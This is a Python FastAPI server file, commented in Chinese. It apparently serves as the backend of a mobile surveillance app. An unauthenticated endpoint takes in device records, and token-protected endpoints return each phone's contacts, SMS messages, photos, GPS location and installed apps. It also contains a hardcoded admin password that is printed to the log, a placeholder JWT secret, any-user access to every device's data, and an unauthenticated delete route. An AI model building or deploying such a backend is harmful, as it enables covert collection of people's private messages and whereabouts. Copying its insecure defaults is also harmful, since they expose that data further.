from fastapi import FastAPI, HTTPException, Depends, Request, Path
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel
from jose import JWTError, jwt
from datetime import datetime, timedelta
from typing import Optional
from sqlmodel import Session, select, SQLModel
from passlib.context import CryptContext
import traceback

from database import get_session, engine
from models import User, Device, Location, Contact, Message, Photo, App
from auth import verify_password, get_password_hash

# =========================
# ⚡ FastAPI 实例
# =========================
app = FastAPI()

# =========================
# ⚡ 数据库初始化 + 管理员创建
# =========================
SQLModel.metadata.create_all(engine)
print("✅ 数据表已创建/检查完成")

with Session(engine) as session:
    admin_email = "admin@example.com"
    admin_password = "admin123"
    existing = session.exec(select(User).where(User.email == admin_email)).first()
    if not existing:
        admin = User(
            email=admin_email,
            full_name="Admin",
            is_active=True,
            is_admin=True,
            hashed_password=get_password_hash(admin_password)
        )
        session.add(admin)
        session.commit()
        print(f"✅ 管理员账号已创建: {admin_email} / {admin_password}")
    else:
        print(f"ℹ️ 管理员账号 {admin_email} 已存在")

# =========================
# ⚡ 异常捕获中间件
# =========================
@app.middleware("http")
async def log_exceptions(request: Request, call_next):
    try:
        response = await call_next(request)
        return response
    except Exception as e:
        print("Exception during request:", e)
        traceback.print_exc()
        raise e

# =========================
# ⚡ 跨域配置
# =========================
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",
        "http://127.0.0.1:5173",
        "https://beamish-arithmetic-21d959.netlify.app"
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# =========================
# ⚡ JWT 配置
# =========================
SECRET_KEY = "your-secret-key"   # ⚠️生产环境请换成复杂密钥
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="login")
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# =========================
# ⚡ 请求体模型
# =========================
class AddUserRequest(BaseModel):
    username: str
    password: str

# =========================
# ⚡ Token 工具
# =========================
def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=15))
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def decode_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Token 无效或已过期")

# =========================
# ⚡ 根路由
# =========================
@app.get("/")
def root():
    return {"status": "ok"}

# =========================
# ⚡ 登录
# =========================
@app.post("/login")
def login(form_data: OAuth2PasswordRequestForm = Depends(), session: Session = Depends(get_session)):
    user = session.exec(select(User).where(User.email == form_data.username)).first()
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(status_code=401, detail="用户名或密码错误")

    role = "admin" if user.is_admin else "user"

    access_token = create_access_token(
        data={"sub": str(user.id), "role": role},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES),
    )
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "role": role,
        "username": user.email,
    }

# =========================
# ⚡ 用户管理（仅管理员）
# =========================
@app.post("/users/add")
def add_user(req: AddUserRequest, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    payload = decode_token(token)
    if payload["role"] != "admin":
        raise HTTPException(status_code=403, detail="只有管理员可以添加用户")

    existing = session.exec(select(User).where(User.email == req.username)).first()
    if existing:
        raise HTTPException(status_code=400, detail="用户已存在")

    new_user = User(
        email=req.username,
        hashed_password=pwd_context.hash(req.password),
        is_admin=False,
    )
    session.add(new_user)
    session.commit()
    session.refresh(new_user)
    return {"message": f"用户 {req.username} 添加成功"}

@app.get("/users")
def get_users(token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    payload = decode_token(token)
    if payload.get("role") != "admin":
        raise HTTPException(status_code=403, detail="只有管理员可以查看用户列表")

    users = session.exec(select(User)).all()
    return [{"email": u.email, "role": "admin" if u.is_admin else "user"} for u in users]

@app.delete("/users/{username}")
def delete_user(username: str, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    payload = decode_token(token)
    if payload["role"] != "admin":
        raise HTTPException(status_code=403, detail="只有管理员可以删除用户")

    user = session.exec(select(User).where(User.email == username)).first()
    if not user:
        raise HTTPException(status_code=404, detail="用户不存在")
    if user.is_admin:
        raise HTTPException(status_code=403, detail="不能删除管理员账号")

    session.delete(user)
    session.commit()
    return {"message": f"用户 {username} 已删除"}

# =========================
# ⚡ 客户管理（示例）
# =========================
fake_customers_db = [
    {"id": 1, "name": "张三", "email": "zhangsan@test.com"},
    {"id": 2, "name": "李四", "email": "lisi@test.com"},
]

@app.get("/customers")
def get_customers():
    return fake_customers_db

@app.delete("/customers/{customer_id}")
def delete_customer(customer_id: int):
    global fake_customers_db
    fake_customers_db = [c for c in fake_customers_db if c["id"] != customer_id]
    return {"message": f"客户 {customer_id} 已删除"}

# =========================
# ⚡ 设备相关接口
# =========================
def get_device_or_404(device_id: int, session: Session) -> Device:
    device = session.get(Device, device_id)
    if not device:
        raise HTTPException(status_code=404, detail="设备不存在")
    return device

@app.post("/app_login")
def app_login(device: Device, session: Session = Depends(get_session)):
    session.add(device)
    session.commit()
    session.refresh(device)
    return {"message": "登录信息已保存", "id": device.id}

@app.get("/devices")
def get_devices(token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    payload = decode_token(token)
    if payload["role"] != "admin":
        raise HTTPException(status_code=403, detail="只有管理员可以查看设备列表")
    devices = session.exec(select(Device)).all()
    return devices

@app.get("/device/{device_id}")
def get_device_by_id(device_id: int, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    payload = decode_token(token)
    if payload["role"] == "admin":
        return get_device_or_404(device_id, session)
    return get_device_or_404(device_id, session)

@app.get("/devices/{device_id}/contacts")
def get_contacts(device_id: int = Path(...), token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    decode_token(token)
    device = get_device_or_404(device_id, session)
    return {"device_id": device.id, "contacts": device.contacts}

@app.get("/devices/{device_id}/messages")
def get_messages(device_id: int, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    decode_token(token)
    device = get_device_or_404(device_id, session)
    return {"device_id": device.id, "messages": device.sms}

@app.get("/devices/{device_id}/photos")
def get_photos(device_id: int, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    decode_token(token)
    device = get_device_or_404(device_id, session)
    return {"device_id": device.id, "photos": device.photos}

@app.get("/devices/{device_id}/location")
def get_location(device_id: int, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    decode_token(token)
    device = get_device_or_404(device_id, session)
    location = session.exec(select(Location).where(Location.device_id == device_id).order_by(Location.timestamp.desc())).first()
    if not location:
        raise HTTPException(status_code=404, detail="该设备没有定位信息")
    return {
        "device_id": device_id,
        "latitude": location.latitude,
        "longitude": location.longitude,
        "address": location.address,
        "timestamp": location.timestamp
    }

@app.get("/devices/{device_id}/apps")
def get_apps(device_id: int, token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    decode_token(token)
    device = get_device_or_404(device_id, session)
    return {"device_id": device.id, "apps": device.apps}
